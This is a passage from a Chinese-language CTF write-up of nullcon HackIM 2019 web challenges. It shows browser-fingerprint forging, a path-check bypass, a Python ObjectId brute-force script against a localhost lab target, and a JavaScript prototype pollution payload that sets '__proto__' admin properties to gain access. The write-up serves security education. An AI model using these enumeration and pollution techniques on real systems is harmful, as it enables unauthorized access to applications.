    Content-Length: 49
    Connection: close
    Cookie: continueCode=PJgGlaHKhetvcbIlToCVsZFLinSyHZuQcgCJfZSbuphvCV9slmH6ET5v08yK; cookieconsent_status=dismiss; PHPSESSID=877d4hrk97pg1qbnpb37sejqh7
    Cache-Control: max-age=0
    m=36743815193629702779&token=index.html&b=FireFox
跟进`bjs_l()`函数，发现初始化了两个`fpbrowser_v1`类，并且调用了`get()`函数返回值作为 ajax 请求中 m 的 value
值，关键就在`Fingerprint.prototype`这里的`get`函数，这里用`keys`数组存储了一系列的参数，但是其实主要的只是以下几个，因为其他参数我们完全可以直接用
windows 10 装一个最新的 chrome 来模拟环境，就不需要完全修改参数了
  * navigator.language — 题目设置已经告诉我们 “Alice is a admin of abc company in india”
  * navigator.userAgent — 题目 hint 给出 windows 10 chrome
  * getTimezoneOffset() — India 的时区
  * getCanvasFingerprint
大致就是以上因素，我们可以从 hint 中找到大部分的参数，设置`navigator.language`可以用 india 的 language
解决，`getTimezoneOffset`我们可以算得到是-300，唯独`getCanvasFingerprint`我们不太清楚，经过仔细查阅资料知道这个实现的就是`Canvas
Fingerprinting`，而题目中那个注释以及 hint 也给出了，应该就是用 `index.html`中的那个`canvas`图片
所以通过这些几个设置，我们就可以得到`trackuser.php`中请求参数`m`的值为 2656613544186699742 ，发包得到对应的
Cookie
带着 Cookie 登录 `admin/admin`，得到下一步
直接访问，发现是个目录列举。
直接访问`admin.php`，发现`not_authorized`
而`pack-9d392b4893d01af61c5712fdf5aafd8f24d06a10.pack`文件则可以直接下载，我们可以通过[git tips
只有一个 pack 文件恢复整个系统](http://du1abadd.org/2010/git-tips-%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA-pack-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E6%95%B4%E4%B8%AA%E7%B3%BB%E7%BB%9F/)
得到`admin.php`文件
     "1");
        if ($pageListArray[$langfilename] != 1) {
            echo "not_authorized";
            Header("Location: index.php?not_authorized");
        } else {
            echo "hackim19{}";
        }
    } else {
        echo "you need to complete the first barrier";
    }
    ?>
简单审计，获取路径后检查`index.php`是否存在路径当中，我们用`admin.php/index.php`就可以简单绕过得到 flag
###  proton
> ​ Alice web site has been hacked and hackers removed the submit post option
> and posted some unwanted messages can you get them?
>
> Hint
>
>   * mango can be eaten in 60 seconds
>   * Mongo Mongo Mongo !!! and this is not a sql Injection
>
题目设置
访问`/getPOST`又得到
添加`id`参数访问
单引号尝试注入，发现报错
注入无果后，看了一下发现是个 Node.js 的站，尝试使用之前的 payload 检查错误信息
然而并没有发现什么可疑的js库，而且题目既然给出了不是 sql 注入的话，我们就需要得另找方向。
MongoDB 中有一个`ObjectId`的概念，它是一种 MongoDB 的类型
> ​ ObjectIds are small, likely unique, fast to generate, and ordered.
> ObjectId values consist of 12 bytes, where the first four bytes are a
> timestamp that reflect the ObjectId’s creation. Specifically:
>
>   * a 4-byte value representing the seconds since the Unix epoch,
>   * a 5-byte random value, and
>   * a 3-byte counter, starting with a random value.
>
参考[Angstrom CTF 2018] The Best Website Write-up
(Web230)](https://www.pwndiary.com/write-ups/angstrom-ctf-2018-the-best-website-write-up-web230/)，我们可以发现中间5位虽然随机产生，但是是固定的，所以我们需要做的就是猜解前4位以及后3位。而题目给出
hint 意思是时间差应该是小于等于 60s
，然后最后三位根据一开始给出的`id=5c51b9c9144f813f31a4c0e2`，从`a4c0e2`开始`+1`枚举到`a4c0ef`，但是这道题比较坑的地方也就在这，最后题目顺序并不是从这顺推的，而是逆序枚举的，而且时间也不是整
60s ，所以还需要向前枚举。这里推荐大家使用[MongoDB ObjectId ↔ Timestamp
Converter](https://steveridout.github.io/mongo-object-time/)方便查看时间戳
    import requests
    url = 'http://localhost:4545/getPOST?id=%s144f813f31%s'  
    time = 0x5c51b9c9  
    counter = 0xa4c0e2
    for i in range(100):  
        counter = hex(counter - 1)[2:]
        for i in range(1000000):
            time = hex(time - 1)[2:] 
            nurl = url % (time, counter)
            res = requests.get(nurl)
            if 'Not found' not in res.text:
                print(res.text, nurl)
                time = int(time, 16)
                counter = int(counter, 16)
                break
            time = int(time, 16)
终于在`id=5c51b911144f813f31a4c0df`得到关键信息
    I told you you follow the White Rabbit. http://localhost:4545/getPOST?id=5c51b98d144f813f31a4c0e1
    Did you actually come back ?? Go Away! http://localhost:4545/getPOST?id=5c51b952144f813f31a4c0e0
    Shit MR Anderson and his agents are here. Hurryup!. Pickup the landline phone to exit back to matrix! - /4f34685f64ec9b82ea014bda3274b0df/  http://localhost:4545/getPOST?id=5c51b911144f813f31a4c0df
访问`/5c51b911144f813f31a4c0df`得到源码
    'use strict';
    const express = require('express');
    const bodyParser = require('body-parser')
    const cookieParser = require('cookie-parser');
    const path = require('path');
    const isObject = obj => obj && obj.constructor && obj.constructor === Object;
    function merge(a,b){
     for (var attr in b){   
       if(isObject(a[attr]) && isObject(b[attr])){
          merge(a[attr],b[attr]);
       }
       else{
        a[attr] = b[attr];
     }
     }  
     return a 
    } 
    function clone(a){
      return merge({},a);
    }
    // Constants
    const PORT = 8080;
    const HOST = '0.0.0.0';
    const admin = {};
    // App
    const app = express();
    app.use(bodyParser.json())
    app.use(cookieParser());
    app.use('/', express.static(path.join(__dirname, 'views')))
    app.post('/signup', (req, res) => {
      var body = JSON.parse(JSON.stringify(req.body));
      var copybody = clone(body)
      if(copybody.name){
          res.cookie('name', copybody.name).json({"done":"cookie set"}); 
      }
      else{
        res.json({"error":"cookie not set"})
      }
    });
    app.get('/getFlag', (req, res) => {
         var аdmin=JSON.parse(JSON.stringify(req.cookies))
        if(admin.аdmin==1){
          res.send("hackim19{}");
        }
        else{
          res.send("You are not authorized"); 
        }
    });
    app.listen(PORT, HOST);
    console.log(`Running on http://${HOST}:${PORT}`);
需要我们将`const admin`的`admin`属性设置为1，比较明显的一个 js
原型链污染，我们只需要让一个`Object.prototype`设置为`{"admin":1}`即可，而我们还需要一个`name`参数，所以我们大致可以这样构造：`{"name":
"xxx", "__proto__":{"аdmin":"1"}}`
在第二个for循环中，由于`__proto__`是一个`Object`，会递归进入`merge()`，由于`__proto__`有一对`key-value`，所以会判断`__proto__["admin"]`是否是`Object`，不是就进入`else`，对原型`__proto__["admin"]`赋值为1，这就完成了原型链污染的操作。
最后访问`/getFlag`成功获得flag
    hackim19{Prototype_for_the_win}
国内关于原型链的文章还是比较少的，推荐一篇梅子酒师傅写的[JavaScript原型链污染](https://otakekumi.github.io/2018/09/11/JavaScript_Prototype_Pollution/)，写的还是不错的。